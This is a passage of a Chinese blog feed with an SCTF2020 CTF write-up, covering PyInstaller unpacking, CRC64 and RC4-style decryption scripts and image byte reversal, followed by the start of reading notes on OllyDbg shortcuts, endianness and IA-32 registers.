    <content type="html"><![CDATA[<p>第一次做了做XCTF的题，对于逆向新手的只做了3个杂项。。赛后看逆向writeup学习了。<a id="more"></a></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse:"></a>Reverse:</h2><h3 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h3><p>题目下载下来很大，一般的exe文件都不会这么大，可以考虑是从py文件打包成的exe文件。</p><p>载入ida看一下字符串，有很多py开头的和__main__的。从经验来看，这是pyinstaller打包的。使用<code>python    pyinstxtractor.py    signin.exe</code> 还原python代码。对其中main文件进行文件头补齐，然后使用<code>uncompyle6 -o main.py main.pyc</code>将.pyc转化为.py文件。</p><p>但是由于这是python3.8写的py文件，如果在python3.7下使用uncompyle6会提示文件有损，使用python3.8。去升级了python3.8后。<img src="/2020/07/10/SCTF2020/image-20200714101947068.png" alt="image-20200714101947068"></p><p>打开py文件，程序启动会释放一个dll文件（这在运行程序的时候可以看到）。整体逻辑还是很简单，首先将一个账户以字典形式存储，然后将我们输入的name与密码传入dll文件的一个加密函数后返回，判断与存储的账户是否相等。</p><p>ida载入dll文件的enc加密函数：一个CRC64与异或。<img src="/2020/07/10/SCTF2020/image-20200714102629777.png" alt="image-20200714102629777"></p><p>如果之前接触过CRC64，那这里就会很简单。但是我第一次遇到，有点恼火。</p><p>首先使用python得到异或之前的key：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = list(base64.b64decode(<span class="string">b'PLHCu+fujfZmMOMLGHCyWWOq5H5HDN2R5nHnlV30Q0EA'</span>))</span><br><span class="line">t = <span class="string">"SCTFer"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">s[i] ^= ord(t[i%len(t)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (s)</span><br></pre></td></tr></table></figure><p>C语言写CRC64解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[] = &#123;<span class="number">111</span>, <span class="number">242</span>, <span class="number">150</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">156</span>, <span class="number">222</span>, <span class="number">181</span>, <span class="number">50</span>, <span class="number">118</span>, <span class="number">134</span>, <span class="number">121</span>, <span class="number">75</span>, <span class="number">51</span>, <span class="number">230</span>, <span class="number">31</span>, <span class="number">6</span>, <span class="number">216</span>, <span class="number">183</span>, <span class="number">61</span>, <span class="number">19</span>, <span class="number">74</span>, <span class="number">184</span>, <span class="number">227</span>, <span class="number">181</span>, <span class="number">50</span>, <span class="number">179</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">134</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">84</span>&#125;;</span><br><span class="line">_int64 *ans = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">ans = (_int64 *)(s+i);</span><br><span class="line"><span class="keyword">if</span>(*ans &amp; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(*ans &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">*ans ^= <span class="number">0xB0004B7679FA26B3</span>;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">*ans += <span class="number">0x8000000000000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">*ans ^= <span class="number">0xB0004B7679FA26B3</span>;</span><br><span class="line">*ans /= <span class="number">2</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(*ans &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">*ans += <span class="number">0x8000000000000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, s[j]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：<img src="/2020/07/10/SCTF2020/image-20200714103110024.png" alt="image-20200714103110024"></p><p><strong>总结：1.CRC64加密与解密。2.反编译python文件。</strong></p><h3 id="get-up"><a href="#get-up" class="headerlink" title="get_up"></a>get_up</h3><p>运行一下，提示输入一个word。载入ida，shift+f12看到该字符串，来到引用的地方：<img src="/2020/07/10/SCTF2020/image-20200714150947146.png" alt="image-20200714150947146"></p><p>进入sub_401df0：开始只是感觉复杂，但看见输入单词加密后与<strong>32位的a-f+0-9</strong>的字符串，猜测是md5加密。随便找了一个cmd5网站解密：<img src="/2020/07/10/SCTF2020/image-20200714151246530.png" alt="image-20200714151246530"></p><p>继续看下面的sub_402B00(“.reioc”)ke：进入可以看到是先获得image_base，然后依次加地址，直到获得.reioc节区的首地址。</p><p>最后引用输入的：sycsyc对.reioc节区进行了重写。这里使用idcpython脚本或载入OD动调都可以得到改写后的节区。</p><p>载入OD，调试可以发现重写的代码正是接下来要执行的，dump再载入ida：<img src="/2020/07/10/SCTF2020/image-20200714152255641.png" alt="image-20200714152255641"></p><p>可以看到与之前的类似，但这次是改写.ebata节区，使用同样的方法，OD中dump出载入ida。</p><p>进入改写.ebata后的最后一个节区：<img src="/2020/07/10/SCTF2020/image-20200714152729970.png" alt="image-20200714152729970"></p><p>看加密函数：<img src="/2020/07/10/SCTF2020/image-20200714152932947.png" alt="image-20200714152932947"></p><p>从OD动调得到表后写C语言爆破：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> od[<span class="number">256</span>] = &#123;<span class="number">0x00000031</span>, <span class="number">0x00000050</span>, <span class="number">0x00000052</span>, <span class="number">0x000000C1</span>, <span class="number">0x000000CD</span>, <span class="number">0x000000A7</span>, <span class="number">0x00000007</span>, <span class="number">0x00000039</span>, <span class="number">0x0000003D</span>, <span class="number">0x00000004</span>, </span><br><span class="line"><span class="number">0x000000FD</span>, <span class="number">0x000000C4</span>, <span class="number">0x0000002A</span>, <span class="number">0x00000072</span>, <span class="number">0x000000DF</span>, <span class="number">0x00000060</span>, <span class="number">0x000000E3</span>, <span class="number">0x000000BD</span>, <span class="number">0x000000E2</span>, <span class="number">0x00000061</span>, </span><br><span class="line"><span class="number">0x000000E4</span>, <span class="number">0x00000063</span>, <span class="number">0x000000EA</span>, <span class="number">0x000000FF</span>, <span class="number">0x000000FE</span>, <span class="number">0x00000009</span>, <span class="number">0x000000F9</span>, <span class="number">0x000000C3</span>, <span class="number">0x000000CE</span>, <span class="number">0x0000009E</span>, </span><br><span class="line"><span class="number">0x00000025</span>, <span class="number">0x0000006A</span>, <span class="number">0x0000004C</span>, <span class="number">0x000000DC</span>, <span class="number">0x00000013</span>, <span class="number">0x000000F0</span>, <span class="number">0x00000083</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000024</span>, <span class="number">0x000000DB</span>, </span><br><span class="line"><span class="number">0x000000DD</span>, <span class="number">0x0000007F</span>, <span class="number">0x000000EF</span>, <span class="number">0x0000008C</span>, <span class="number">0x0000003E</span>, <span class="number">0x000000E1</span>, <span class="number">0x00000026</span>, <span class="number">0x0000006F</span>, <span class="number">0x00000092</span>, <span class="number">0x00000006</span>, </span><br><span class="line"><span class="number">0x000000F7</span>, <span class="number">0x00000096</span>, <span class="number">0x000000D0</span>, <span class="number">0x000000B4</span>, <span class="number">0x000000E7</span>, <span class="number">0x000000F8</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000078</span>, <span class="number">0x000000F2</span>, <span class="number">0x000000AA</span>, </span><br><span class="line"><span class="number">0x00000044</span>, <span class="number">0x00000032</span>, <span class="number">0x00000036</span>, <span class="number">0x0000005A</span>, <span class="number">0x000000EC</span>, <span class="number">0x000000A6</span>, <span class="number">0x0000007B</span>, <span class="number">0x00000008</span>, <span class="number">0x000000C0</span>, <span class="number">0x0000002E</span>, </span><br><span class="line"><span class="number">0x0000009B</span>, <span class="number">0x00000084</span>, <span class="number">0x00000055</span>, <span class="number">0x0000009C</span>, <span class="number">0x000000AE</span>, <span class="number">0x00000065</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000010</span>, <span class="number">0x00000053</span>, <span class="number">0x00000088</span>, </span><br><span class="line"><span class="number">0x00000049</span>, <span class="number">0x00000046</span>, <span class="number">0x000000AB</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000059</span>, <span class="number">0x0000007E</span>, <span class="number">0x000000E5</span>, <span class="number">0x000000B3</span>, <span class="number">0x000000F6</span>, </span><br><span class="line"><span class="number">0x00000048</span>, <span class="number">0x0000001A</span>, <span class="number">0x000000D1</span>, <span class="number">0x000000A4</span>, <span class="number">0x00000067</span>, <span class="number">0x0000006B</span>, <span class="number">0x000000BA</span>, <span class="number">0x00000087</span>, <span class="number">0x00000073</span>, <span class="number">0x0000004B</span>, </span><br><span class="line"><span class="number">0x000000A2</span>, <span class="number">0x000000CF</span>, <span class="number">0x0000001D</span>, <span class="number">0x00000018</span>, <span class="number">0x000000D4</span>, <span class="number">0x000000BB</span>, <span class="number">0x0000002C</span>, <span class="number">0x00000070</span>, <span class="number">0x00000093</span>, <span class="number">0x000000AC</span>, </span><br><span class="line"><span class="number">0x0000000F</span>, <span class="number">0x0000007A</span>, <span class="number">0x00000051</span>, <span class="number">0x000000B5</span>, <span class="number">0x00000021</span>, <span class="number">0x00000085</span>, <span class="number">0x00000045</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001C</span>, <span class="number">0x0000009F</span>, </span><br><span class="line"><span class="number">0x00000081</span>, <span class="number">0x0000005C</span>, <span class="number">0x0000004A</span>, <span class="number">0x00000095</span>, <span class="number">0x0000001B</span>, <span class="number">0x00000016</span>, <span class="number">0x000000D2</span>, <span class="number">0x000000C7</span>, <span class="number">0x000000E0</span>, <span class="number">0x000000DA</span>, </span><br><span class="line"><span class="number">0x00000058</span>, <span class="number">0x000000A9</span>, <span class="number">0x0000001E</span>, <span class="number">0x000000D7</span>, <span class="number">0x000000C2</span>, <span class="number">0x00000069</span>, <span class="number">0x00000071</span>, <span class="number">0x000000D6</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000075</span>, </span><br><span class="line"><span class="number">0x000000BC</span>, <span class="number">0x00000066</span>, <span class="number">0x000000FA</span>, <span class="number">0x00000030</span>, <span class="number">0x000000AD</span>, <span class="number">0x00000099</span>, <span class="number">0x0000008B</span>, <span class="number">0x00000077</span>, <span class="number">0x00000041</span>, <span class="number">0x00000097</span>, </span><br><span class="line"><span class="number">0x00000022</span>, <span class="number">0x000000B8</span>, <span class="number">0x000000B2</span>, <span class="number">0x000000D3</span>, <span class="number">0x00000047</span>, <span class="number">0x000000C6</span>, <span class="number">0x00000079</span>, <span class="number">0x00000014</span>, <span class="number">0x0000000B</span>, <span class="number">0x000000F4</span>, </span><br><span class="line"><span class="number">0x0000003F</span>, <span class="number">0x00000011</span>, <span class="number">0x0000002B</span>, <span class="number">0x000000DE</span>, <span class="number">0x000000EE</span>, <span class="number">0x000000F3</span>, <span class="number">0x000000F5</span>, <span class="number">0x000000AF</span>, <span class="number">0x000000A5</span>, <span class="number">0x00000086</span>, </span><br><span class="line"><span class="number">0x00000091</span>, <span class="number">0x000000BE</span>, <span class="number">0x0000008E</span>, <span class="number">0x0000008F</span>, <span class="number">0x000000E8</span>, <span class="number">0x000000E6</span>, <span class="number">0x000000B1</span>, <span class="number">0x0000004E</span>, <span class="number">0x00000037</span>, <span class="number">0x000000D5</span>, </span><br><span class="line"><span class="number">0x000000FC</span>, <span class="number">0x0000004D</span>, <span class="number">0x0000005E</span>, <span class="number">0x00000042</span>, <span class="number">0x000000CA</span>, <span class="number">0x00000035</span>, <span class="number">0x000000C8</span>, <span class="number">0x0000006E</span>, <span class="number">0x000000A3</span>, <span class="number">0x00000089</span>, </span><br><span class="line"><span class="number">0x00000015</span>, <span class="number">0x0000006D</span>, <span class="number">0x00000003</span>, <span class="number">0x0000008A</span>, <span class="number">0x0000008D</span>, <span class="number">0x000000D8</span>, <span class="number">0x00000076</span>, <span class="number">0x000000CB</span>, <span class="number">0x000000C5</span>, <span class="number">0x000000F1</span>, </span><br><span class="line"><span class="number">0x0000006C</span>, <span class="number">0x000000B9</span>, <span class="number">0x00000017</span>, <span class="number">0x00000064</span>, <span class="number">0x00000068</span>, <span class="number">0x000000E9</span>, <span class="number">0x00000056</span>, <span class="number">0x00000029</span>, <span class="number">0x00000090</span>, <span class="number">0x000000ED</span>, </span><br><span class="line"><span class="number">0x00000074</span>, <span class="number">0x0000000D</span>, <span class="number">0x000000EB</span>, <span class="number">0x000000B0</span>, <span class="number">0x000000A1</span>, <span class="number">0x00000094</span>, <span class="number">0x00000080</span>, <span class="number">0x000000C9</span>, <span class="number">0x0000007C</span>, <span class="number">0x000000B7</span>, </span><br><span class="line"><span class="number">0x00000028</span>, <span class="number">0x00000005</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000023</span>, <span class="number">0x0000009D</span>, <span class="number">0x000000A0</span>, <span class="number">0x00000027</span>, <span class="number">0x00000098</span>, <span class="number">0x00000043</span>, <span class="number">0x0000007D</span>, </span><br><span class="line"><span class="number">0x000000BF</span>, <span class="number">0x0000004F</span>, <span class="number">0x00000012</span>, <span class="number">0x00000034</span>, <span class="number">0x000000A8</span>, <span class="number">0x000000D9</span>, <span class="number">0x00000057</span>, <span class="number">0x00000033</span>, <span class="number">0x0000009A</span>, <span class="number">0x00000001</span>, </span><br><span class="line"><span class="number">0x00000054</span>, <span class="number">0x0000002F</span>, <span class="number">0x0000003C</span>, <span class="number">0x00000062</span>, <span class="number">0x00000038</span>, <span class="number">0x000000FB</span>, <span class="number">0x00000082</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000003A</span>, <span class="number">0x00000019</span>, </span><br><span class="line"><span class="number">0x0000005D</span>, <span class="number">0x000000B6</span>, <span class="number">0x00000040</span>, <span class="number">0x00000020</span>, <span class="number">0x000000CC</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">0x00000080</span>, <span class="number">0x00000055</span>, <span class="number">0x0000007E</span>, <span class="number">0x0000002D</span>, <span class="number">0x000000D1</span>, <span class="number">0x00000009</span>, <span class="number">0x00000025</span>, <span class="number">0x000000AB</span>, <span class="number">0x0000003C</span>, <span class="number">0x00000056</span>, </span><br><span class="line"><span class="number">0x00000095</span>, <span class="number">0x000000C4</span>, <span class="number">0x00000036</span>, <span class="number">0x00000013</span>, <span class="number">0x000000ED</span>, <span class="number">0x00000072</span>, <span class="number">0x00000024</span>, <span class="number">0x00000093</span>, <span class="number">0x000000B2</span>, <span class="number">0x000000C8</span>, </span><br><span class="line"><span class="number">0x00000045</span>, <span class="number">0x000000EC</span>, <span class="number">0x00000016</span>, <span class="number">0x0000006B</span>, <span class="number">0x00000067</span>, <span class="number">0x0000001D</span>, <span class="number">0x000000F9</span>, <span class="number">0x000000A3</span>, <span class="number">0x00000096</span>, <span class="number">0x000000D9</span>, </span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> v10 = <span class="number">0</span>, v11 = <span class="number">0</span>, v6 = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v11 = (v11 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">v10 = (*(od + v11) + v10) % <span class="number">256</span>;</span><br><span class="line">*(od +  v11) = (*(od +  v10) &amp; ~*(od +  v11)) | (*(od +  v11) &amp; ~*(od +  v10));</span><br><span class="line">    *(od +  v10) = (*(od +  v10) &amp; ~*(od +  v11)) | (*(od +  v11) &amp; ~*(od +  v10));</span><br><span class="line">    *(od +  v11) = (*(od +  v10) &amp; ~*(od +  v11)) | (*(od +  v11) &amp; ~*(od +  v10));</span><br><span class="line">    v6 = (*(od +  v10) + *(od +  v11)) % <span class="number">256</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">    temp = j;</span><br><span class="line">    temp ^= *(od +  v6);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(temp == a[i])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">flag[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：<img src="/2020/07/10/SCTF2020/image-20200714153241364.png" alt="image-20200714153241364"></p><p>下面使用idcpython脚本执行来得到改写的区段，首先ctrl+s查看区段的首地址：<img src="/2020/07/10/SCTF2020/image-20200714161123125.png" alt="image-20200714161123125"></p><p>shift+f2输入要执行的脚本，执行：<img src="/2020/07/10/SCTF2020/image-20200714161222707.png" alt="image-20200714161222707"></p><p>得到改写的数据后，先u让数据未定义，再p转化为函数。<img src="/2020/07/10/SCTF2020/image-20200714162237927.png" alt="image-20200714162237927"></p><p><strong>总结：多猜测，对数据的敏感性，这道题开始想到是hash简单很多。</strong></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>直接挂VPN进入所给网址：<img src="/2020/07/10/SCTF2020/image-20200720211239002.png" alt="image-20200720211239002"></p><h3 id="Easymisc"><a href="#Easymisc" class="headerlink" title="Easymisc"></a>Easymisc</h3><p>附件下载后是一张图片，图片名字是倒序的且打不开。</p><p>拖进010editor发现jpg图片的尾巴格式但是倒序的，结合图片名字可以知道要将图片的信息倒序，这里注意是成对的倒序还是一个一个倒序。<img src="/2020/07/10/SCTF2020/image-20200720212540806.png" alt="image-20200720212540806"></p><p>复制出数据的十六进制格式，写python脚本倒序写入文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">s = <span class="string">'复制的图片的二进制信息‘</span></span><br><span class="line"><span class="string">s = s[::-1]</span></span><br><span class="line"><span class="string">with open('</span>flag.jpg<span class="string">', "wb") as f:</span></span><br><span class="line"><span class="string">    for i in range(0, len(s), 2):</span></span><br><span class="line"><span class="string">        n = s[i]+s[i+1]</span></span><br><span class="line"><span class="string">        ans = struct.pack('</span>B<span class="string">', int(n, 16))</span></span><br><span class="line"><span class="string">        f.write(ans)</span></span><br><span class="line"><span class="string">f.close()</span></span><br></pre></td></tr></table></figure><p>得到逆序后的文件，补齐jpg图片的文件头后打开图片：<img src="/2020/07/10/SCTF2020/image-20200720213434806.png" alt="image-20200720213434806">f</p><p>发现不对，看看图片属性：<img src="/2020/07/10/SCTF2020/image-20200720213644954.png" alt="image-20200720213644954"></p><p>最后载入010editor发现更多的信息：<img src="/2020/07/10/SCTF2020/image-20200720213808864.png" alt="image-20200720213808864"></p><p>最后找在线网站进行rc4解密：<img src="/2020/07/10/SCTF2020/image-20200720213948350.png" alt="image-20200720213948350"></p><h3 id="doudizhu"><a href="#doudizhu" class="headerlink" title="doudizhu"></a>doudizhu</h3><p>直接玩游戏通关，有游戏体验。。哈哈</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次做了做XCTF的题，对于逆向新手的只做了3个杂项。。赛后看逆向writeup学习了。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>逆向工程核心原理读书笔记</title>
    <link href="https://www.bxnop.cn/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.bxnop.cn/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2020-07-01T06:13:51.000Z</published>
    <updated>2020-09-17T14:38:16.003Z</updated>
    
    <content type="html"><![CDATA[<p><strong>PS：本书将指引你进入美妙又刺激的代码逆向分析世界，开启一段神奇之旅！</strong><a id="more"></a></p><h2 id="第二章-逆向分析-Hello-World-程序"><a href="#第二章-逆向分析-Hello-World-程序" class="headerlink" title="第二章 逆向分析 Hello World!程序"></a>第二章 逆向分析 Hello World!程序</h2><h3 id="OD常用快捷键"><a href="#OD常用快捷键" class="headerlink" title="OD常用快捷键"></a>OD常用快捷键</h3><ul><li>执行到返回：ctrl+F9</li></ul><ul><li>重新开始：ctrl+F2</li></ul><ul><li>执行到光标处：F4</li></ul><ul><li>编辑数据：ctrl+E</li></ul><ul><li>编写汇编代码：空格</li></ul><ul><li>注释：；</li></ul><ul><li>设置标签：：</li></ul><h3 id="设置程序大本营"><a href="#设置程序大本营" class="headerlink" title="设置程序大本营"></a>设置程序大本营</h3><p>1.先对所要设置的语句设置一个标签，再通过查看已经设置的标签找到。同时标签可以让代码变得非常直观。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200701143813355.png" alt="image-20200701143813355"></p><p>2.与标签相同的方法，只不过使用 ；，再查看已经设置的注释。</p><p>3.设置断点。</p><p>4.使用命令跳转命令：ctrl+G</p><h3 id="快速查找指定代码"><a href="#快速查找指定代码" class="headerlink" title="快速查找指定代码"></a>快速查找指定代码</h3><p>1.API检索法（1）：在调用代码中设置断点。</p><ul><li>在事先推测出代码要使用API后，鼠标右键菜单-查找-所有模块间之间的调用。找到指定函数后双击查看。<img src="/2020/07/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20200701144638966.png" alt="image-20200701144638966"></li></ul><p>2.API检索法（2）：在API代码中设置断点。</p><ul><li>鼠标右键菜单-查找-所有模块名称，列出被加载的DLL文件中提供的所有API。找到函数，进入下断点，F9执行，在该函数停下后，使用ctrl+F9执行到ret，最后F7回到被调用函数的下一条语句处。</li></ul><hr><h2 id="第三章-小端序标记法"><a href="#第三章-小端序标记法" class="headerlink" title="第三章 小端序标记法"></a>第三章 小端序标记法</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul><li><p>字节序：多字节数据在计算机内存中存储或网络传输时各字节的存储顺序。主要二大类：大端与小端。</p></li><li><p>大端：高地址存放数据的低位，低地址存放数据的高位。</p></li><li><p>小端：高地址存放数据的高位，低地址存放数据的地位。</p></li></ul><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><ul><li>大端序常用于大型UNIX服务器的RISC系列的CPU与网络传输协议中。</li><li>小端序，Intel x86 Cpu采用的序列。</li></ul><hr><h2 id="第四章-IA-32寄存器基本详解"><a href="#第四章-IA-32寄存器基本详解" class="headerlink" title="第四章 IA-32寄存器基本详解"></a>第四章 IA-32寄存器基本详解</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>寄存器：CPU内部用来存放数据的一些小型存储区域。它集成在CPU内部，拥有非常高的读写速度。</p><h3 id="基本程序运行寄存器"><a href="#基本程序运行寄存器" class="headerlink" title="基本程序运行寄存器"></a>基本程序运行寄存器</h3><p>1.通用寄存器（32位 8个）：EAX，EBX，ECX，EDX，ESI，EDI，EBP，ESP</p><p><strong>ps：为了实现对低16位寄存器的兼容，各寄存器又可分为高：H（high），低（L：low）几个独立的寄存器。</strong></p><ul><li>EAX：（0-31）32位</li><li>AX：（0-15）EAX的低16位</li><li>AH：（8-15）AX的高8位</li><li>AL：（0-7）AX的低8位</li></ul><p>EAX：（针对操作数和结果数据的）累加器</p><p>EBX：（DS段中的数据指针）基址寄存器</p><p>ECX：（字符串和循环操作的）计数器</p><p>EDX：（I/O指针）数据寄存器</p><p><strong>ps：以上4个寄存器主要用在算术运算之路中，常常用于保存常量与变量的值，EAX一般用在函数返回值中。</strong></p><p>EBP：（SS段中栈内数据指针）拓展基址指针寄存器</p><p>ESI：（字符串操作源指针）源变址寄存器</p><p>EDI：（字符串操作目标指针）目的变址寄存器</p><p>ESP：（SS段中栈指针）栈指针寄存器</p><p><strong>ps：以上四个寄存器常用作保存内存地址的指针。</strong></p><p>2.段寄存器（16位 